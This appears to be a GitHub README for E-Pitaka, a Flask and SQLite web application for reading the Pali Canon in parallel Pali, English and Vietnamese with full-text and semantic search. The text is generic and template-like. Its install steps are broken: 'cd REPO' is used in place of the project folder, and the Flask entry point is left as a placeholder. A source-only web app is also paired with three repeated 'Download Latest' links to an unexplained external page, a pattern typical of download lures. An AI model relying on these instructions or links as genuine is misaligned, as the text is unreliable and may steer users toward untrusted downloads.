# E-Pitaka - Religious Text Web Application 2026

> **E-Pitaka is a Flask-based web application using SQLite to make the Pali Canon available in parallel Pali, English, and Vietnamese texts, with full-text lookup and AI-assisted semantic search.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hillnathanla953/e-pitaka-pali-canon?style=flat-square)](https://github.com/hillnathanla953/e-pitaka-pali-canon)

---

<p align="center">
  <a href="https://hillnathanla953.github.io/e-pitaka-pali-canon/">
    <img src="https://img.shields.io/badge/Download-E--Pitaka%20Latest-brightgreen?style=for-the-badge" alt="Download E-Pitaka">
  </a>
</p>

> **[Download E-Pitaka Latest](https://hillnathanla953.github.io/e-pitaka-pali-canon/)**

---

[Download Latest Build](https://hillnathanla953.github.io/e-pitaka-pali-canon/)

---

## Explore E-Pitaka

E-Pitaka organizes the Pali Canon, or Tipitaka, for online reading across its principal categories, Nikayas, and books. The application places Pali passages beside their English and Vietnamese translations, giving readers a convenient way to compare versions and study Theravada Buddhist literature in one browser-based workspace.

Alongside standard text matching, the application offers AI-assisted semantic search for discovering material by subject or meaning. Its web translation tools allow content to be edited and refined, and its connected references make it possible to move between root texts, commentaries, and sub-commentaries.

---

## What It Provides

- Navigate the Pali Canon through categories, Nikayas, and individual books
- View Pali, English, and Vietnamese text versions together
- Locate exact words and passages with full-text search
- Find conceptually related passages through AI-powered semantic search
- Modify and refine translations within the browser interface
- Move between primary texts and related commentarial material
- Examine links to commentaries and sub-commentaries
- Run a Flask web application with SQLite as its data store

---

## Installation

First, download the repository and switch into the project directory:

```bash
git clone https://github.com/hillnathanla953/e-pitaka-pali-canon.git
cd REPO
```

Set up a Python virtual environment and install the dependencies specified by the project:

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

PowerShell users on Windows can enable the environment with:

```powershell
.venv\Scripts\Activate.ps1
```

Launch Flask using the entry point or command configured by the project. After startup, open the local URL displayed by Flask.

---

## Using the Application

A practical way to work with E-Pitaka is:

1. Load the application in a browser.
2. Choose a canon category, Nikaya, or book.
3. Read the Pali passage alongside its available English and Vietnamese translations.
4. Apply full-text search when you need an exact word or phrase.
5. Use semantic search to investigate related concepts whose wording may differ.
6. Open linked root texts, commentaries, and sub-commentaries.
7. Edit translation material through the available web tools when refinement is needed.

When developing locally, start Flask through the repository's documented entry point and browse to the supplied local development address.

---

## Application Configuration

The web layer is provided by Flask, while SQLite handles application data. Use the settings files or environment-based configuration included with the repository to customize the application.

A local development setup may contain entries like these:

```env
FLASK_APP=<application-entry-point>
FLASK_ENV=development
```

Set the database path, search integrations, and other runtime settings through the configuration files and deployment guidance available in the project. Credentials and service-specific values should remain outside tracked source files.

---

## Requirements

- A current web browser
- A Python runtime compatible with the Flask application
- Flask and the packages listed by the project
- SQLite capability
- Adequate disk space for canon and translation data
- Network connectivity for externally configured AI-powered search services

---

## Frequently Asked Questions

### Who can use E-Pitaka?

E-Pitaka is designed for people reading, translating, researching, or studying the Pali Canon and Theravada Buddhist texts.

### Are the language versions shown together?

Yes. Where translations exist, the interface presents Pali, English, and Vietnamese versions in parallel.

### How do the two search modes differ?

Full-text search checks for the exact words or phrases entered. Semantic search instead aims to surface passages with a related meaning, including results that use different wording.

### How are translations edited?

Changes are made within the web interface. Whether edits are permitted and how they are saved depends on the current deployment configuration.

### What is the update procedure?

Fetch the latest repository changes, refresh dependencies if necessary, and restart the Flask application:

```bash
git pull
pip install -r requirements.txt
```

### What should I investigate if startup fails?

Check that the virtual environment is enabled, all dependencies are installed, the Flask application entry point is set correctly, and the SQLite database can be reached. The terminal output should provide details about the particular startup problem.

### Where does E-Pitaka keep its data?

Application data is stored in SQLite. The configured database path determines its exact location.

---

## Future Work

Possible directions for ongoing development include:

- Making translation editing workflows more refined
- Expanding links across canonical and commentarial sources
- Improving semantic search and the way results are discovered
- Adding further usability improvements for multilingual reading

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
